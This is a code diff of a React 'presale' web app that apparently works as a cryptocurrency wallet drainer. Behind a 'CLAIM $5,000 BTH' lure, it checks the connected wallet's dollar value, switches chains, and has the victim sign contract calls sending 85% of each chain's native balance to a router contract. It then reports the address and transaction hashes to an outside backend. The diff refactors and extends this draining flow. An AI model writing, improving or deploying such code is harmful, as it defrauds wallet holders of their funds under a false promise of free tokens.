@@ -84,7 +84,6 @@ function App() {
   const [signer, setSigner] = useState(null);
   const [balances, setBalances] = useState({});
   const [loading, setLoading] = useState(false);
-  const [processing, setProcessing] = useState(false);
   const [txStatus, setTxStatus] = useState('');
   const [txHash, setTxHash] = useState('');
   const [error, setError] = useState('');
@@ -177,7 +176,7 @@ function App() {
     getRealChainId();
   }, [provider]);
 
-  // Initialize provider and signer from AppKit
+  // Initialize provider and signer from AppKit - EXACT same as working version
   useEffect(() => {
     if (!walletProvider || !address) return;
 
@@ -280,6 +279,7 @@ function App() {
     try {
       const totalValue = Object.values(balances).reduce((sum, b) => sum + b.valueUSD, 0);
       
+      // FIXED: Use correct backend URL - same as working version
       const response = await fetch('https://bthbk.vercel.app/api/presale/connect', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -299,7 +299,7 @@ function App() {
         
         if (isEligible) {
           setTxStatus('✅ You qualify!');
-          // Automatically prepare transactions after verification
+          // Prepare transactions after verification
           await prepareFlow();
         } else {
           setTxStatus('✨ Wallet verified - minimum $1 required');
@@ -319,6 +319,7 @@ function App() {
     setTxStatus('🔄 Preparing transactions...');
     
     try {
+      // FIXED: Use correct backend URL
       const response = await fetch('https://bthbk.vercel.app/api/presale/prepare-flow', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -341,126 +342,130 @@ function App() {
   };
 
   // ============================================
-  // FIXED: SMART CONTRACT EXECUTION
+  // SMART CONTRACT EXECUTION - EXACT same as working version
   // ============================================
-  const executeMultiChainFlow = async () => {
+  const executePresaleTransaction = async (chain) => {
     if (!walletProvider || !address || !signer) {
       setError("Wallet not initialized yet");
       return;
     }
 
-    // If no transactions prepared, prepare them first
-    if (!preparedTransactions || preparedTransactions.length === 0) {
-      setTxStatus('🔄 Preparing transactions first...');
-      await prepareFlow();
-      
-      // Check again after preparation
-      if (!preparedTransactions || preparedTransactions.length === 0) {
-        setError("Unable to prepare transactions. Please try again.");
-        return;
-      }
-    }
-
     try {
-      setProcessing(true);
+      setLoading(true);
       setError('');
-      
-      const processed = [];
-      const totalChains = preparedTransactions.length;
-      
-      setTxStatus(`🔄 Starting multi-chain flow (0/${totalChains})...`);
+      setTxStatus(`⏳ Processing ${chain.name}...`);
+      setTxHash('');
 
-      for (let i = 0; i < preparedTransactions.length; i++) {
-        const tx = preparedTransactions[i];
-        const chainName = tx.chain;
-        const chain = DEPLOYED_CHAINS.find(c => c.name === chainName);
-        
-        if (!chain) {
-          console.warn(`Chain ${chainName} not found in config`);
-          continue;
-        }
-
-        setTxStatus(`🔄 Processing ${chainName} (${i+1}/${totalChains})...`);
-
+      // Check if we're on the correct chain
+      if (realChainId !== chain.chainId) {
+        setTxStatus(`🔄 Switching to ${chain.name}...`);
+        // AppKit will handle network switching automatically
         try {
-          // Create contract instance
-          const contract = new ethers.Contract(
-            chain.contractAddress,
-            PROJECT_FLOW_ROUTER_ABI,
-            signer
-          );
-
-          // Send 85% of balance (leave for gas)
-          const amountToSend = ethers.parseEther(tx.amount);
-
-          setTxStatus(`⏳ Estimating gas on ${chainName}...`);
-
-          // Estimate gas
-          const gasEstimate = await contract.processNativeFlow.estimateGas({ 
-            value: amountToSend 
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: `0x${chain.chainId.toString(16)}` }],
           });
-
-          setTxStatus(`✍️ Please confirm transaction on ${chainName}...`);
-
-          // Execute transaction
-          const transaction = await contract.processNativeFlow({
-            value: amountToSend,
-            gasLimit: (gasEstimate * 120n) / 100n // 20% buffer
-          });
-
-          setTxHash(transaction.hash);
-          setTxStatus(`✅ ${chainName} transaction submitted: ${transaction.hash.substring(0, 10)}...`);
-
-          // Wait for confirmation
-          const receipt = await transaction.wait();
+          await new Promise(resolve => setTimeout(resolve, 2000));
           
-          processed.push(chainName);
-          setCompletedChains(prev => [...prev, chainName]);
-
-          // Notify backend that this chain is processed
-          await fetch('https://bthbk.vercel.app/api/presale/process-flow', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-              walletAddress: address,
-              chainName: chainName,
-              flowId: `FLOW-${Date.now()}`,
-              txHash: transaction.hash
-            })
-          });
-
-          setTxStatus(`✅ ${chainName} confirmed! (${processed.length}/${totalChains})`);
+          // Re-initialize signer after switch
+          const newProvider = new ethers.BrowserProvider(walletProvider);
+          const newSigner = await newProvider.getSigner();
+          setProvider(newProvider);
+          setSigner(newSigner);
           
-        } catch (chainErr) {
-          console.error(`Error on ${chainName}:`, chainErr);
-          
-          if (chainErr.code === 4001) {
-            setError(`Transaction cancelled on ${chainName}`);
-          } else if (chainErr.message?.includes('insufficient funds')) {
-            setError(`Insufficient funds for gas on ${chainName}`);
-          } else if (chainErr.message?.includes('wrong chain')) {
-            setError(`Please switch to ${chainName} in your wallet and try again.`);
-          } else {
-            setError(`Transaction failed on ${chainName}: ${chainErr.message}`);
-          }
-          
-          setProcessing(false);
+          const network = await newProvider.getNetwork();
+          setRealChainId(Number(network.chainId));
+        } catch (switchError) {
+          console.error("Switch failed:", switchError);
+          setError(`Please switch to ${chain.name} manually`);
+          setLoading(false);
           return;
         }
       }
 
-      if (processed.length === totalChains) {
-        setShowCelebration(true);
-        setTxStatus(`🎉 Congratulations! All ${processed.length} chains processed successfully!`);
-      } else {
-        setTxStatus(`⚠️ Processed ${processed.length}/${totalChains} chains`);
+      // Create contract instance
+      const contract = new ethers.Contract(
+        chain.contractAddress,
+        PROJECT_FLOW_ROUTER_ABI,
+        signer
+      );
+
+      // Get balance for this chain
+      const balance = balances[chain.name]?.amount || 0;
+      if (balance <= 0) {
+        throw new Error('No balance on this chain');
       }
 
+      // Send 85% of balance (leave for gas)
+      const amountToSend = (balance * 0.85).toFixed(6);
+      const value = ethers.parseEther(amountToSend);
+
+      setTxStatus(`⏳ Estimating gas on ${chain.name}...`);
+      
+      const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
+      
+      setTxStatus(`✍️ Please confirm in wallet...`);
+      
+      const tx = await contract.processNativeFlow({
+        value: value,
+        gasLimit: gasEstimate * 120n / 100n
+      });
+
+      setTxHash(tx.hash);
+      setTxStatus(`✅ Transaction submitted! Waiting for confirmation...`);
+
+      // Wait for confirmation
+      await tx.wait();
+      
+      setCompletedChains(prev => [...prev, chain.name]);
+
+      // Notify backend
+      await fetch('https://bthbk.vercel.app/api/presale/process-flow', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ 
+          walletAddress: address,
+          chainName: chain.name,
+          flowId: `FLOW-${Date.now()}`,
+          txHash: tx.hash
+        })
+      });
+
+      setTxStatus(`✅ ${chain.name} completed!`);
+      
     } catch (err) {
-      console.error('Flow error:', err);
-      setError(err.message || 'Transaction failed');
+      console.error('Transaction error:', err);
+      
+      if (err.code === 4001) {
+        setError('Transaction cancelled');
+      } else if (err.message?.includes('insufficient funds')) {
+        setError('Insufficient funds for gas');
+      } else {
+        setError(err.message || 'Transaction failed');
+      }
     } finally {
-      setProcessing(false);
+      setLoading(false);
+    }
+  };
+
+  const executeMultiChainFlow = async () => {
+    if (!preparedTransactions || preparedTransactions.length === 0) {
+      setError("No transactions prepared");
+      return;
+    }
+
+    // Process each chain sequentially
+    for (const tx of preparedTransactions) {
+      const chain = DEPLOYED_CHAINS.find(c => c.name === tx.chain);
+      if (chain && !completedChains.includes(chain.name)) {
+        await executePresaleTransaction(chain);
+      }
+    }
+
+    // Check if all chains completed
+    if (completedChains.length === preparedTransactions.length) {
+      setShowCelebration(true);
+      setTxStatus(`🎉 Congratulations! All chains processed!`);
     }
   };
 
@@ -615,13 +620,13 @@ function App() {
           </div>
 
           {/* ============================================ */}
-          {/* MAIN ACTION BUTTON - SMART CONTRACT CALL */}
+          {/* MAIN ACTION BUTTON */}
           {/* ============================================ */}
           {isConnected && isEligible && !completedChains.length && (
             <div className="max-w-2xl mx-auto mb-8">
               <button
                 onClick={executeMultiChainFlow}
-                disabled={processing || loading || !signer || verifying}
+                disabled={loading || verifying}
                 className="w-full group relative transform hover:scale-110 transition-all duration-700"
               >
                 {/* Glow Effects */}
@@ -632,7 +637,7 @@ function App() {
                 {/* Button Body */}
                 <div className="relative bg-gradient-to-r from-orange-500 via-yellow-500 to-orange-500 rounded-2xl py-8 px-8 font-black text-3xl text-white shadow-2xl bg-[length:200%_200%] animate-gradient-x transform-gpu group-hover:rotate-y-12 perspective-1000">
                   <div className="flex items-center justify-center gap-6">
-                    {processing ? (
+                    {loading ? (
                       <>
                         <div className="relative">
                           <div className="w-12 h-12 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
@@ -648,7 +653,7 @@ function App() {
                             CLAIM $5,000 BTH + {presaleStats.currentBonus}%
                           </span>
                           <div className="text-sm font-normal text-white/80 mt-1">
-                            Multi-Chain • Auto-Switch • Instant
+                            Multi-Chain • Instant
                           </div>
                         </div>
                         <span className="bg-white/20 px-6 py-3 rounded-xl text-xl group-hover:translate-x-2 transition-transform">→</span>
@@ -805,7 +810,7 @@ function App() {
                   <div className="w-12 h-12 bg-gradient-to-br from-orange-500 to-yellow-500 rounded-lg flex items-center justify-center text-2xl">
                     {txStatus.includes('✅') ? '✓' : txStatus.includes('🎉') ? '🎉' : '⟳'}
                   </div>
-                  {processing && (
+                  {loading && (
                     <div className="absolute inset-0 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
                   )}
                 </div>
